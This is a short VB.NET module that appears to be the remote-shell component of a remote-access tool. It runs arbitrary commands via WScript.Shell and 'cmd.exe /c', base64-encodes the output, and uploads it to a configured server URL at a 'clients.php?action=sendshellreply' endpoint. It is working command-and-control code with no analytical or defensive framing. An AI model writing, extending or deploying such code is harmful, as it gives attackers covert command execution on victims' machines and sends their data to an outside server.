Imports System.Net
Imports System.Text

Module WinCMD
    Public Function ShellRun(command As String) As String
        Dim oExec As Object = CreateObject("WScript.Shell").Exec(command)
        Dim oOutput As Object = oExec.StdOut
        Dim result As String = ""

        While Not oOutput.AtEndOfStream
            Dim sLine As Object = oOutput.ReadLine
            If sLine <> "" Then result &= sLine & vbCrLf
        End While

        Return result
    End Function
    Public Sub Run(command As String, ByRef mainWebClient As WebClient)
        Dim shellReply As String = Convert.ToBase64String(Encoding.UTF8.GetBytes(ShellRun("cmd.exe /c " & command)))
        mainWebClient.UploadString(My.Settings.vpsurl, "clients.php?action=sendshellreply&actioncontent=" & shellReply)
    End Sub
End Module
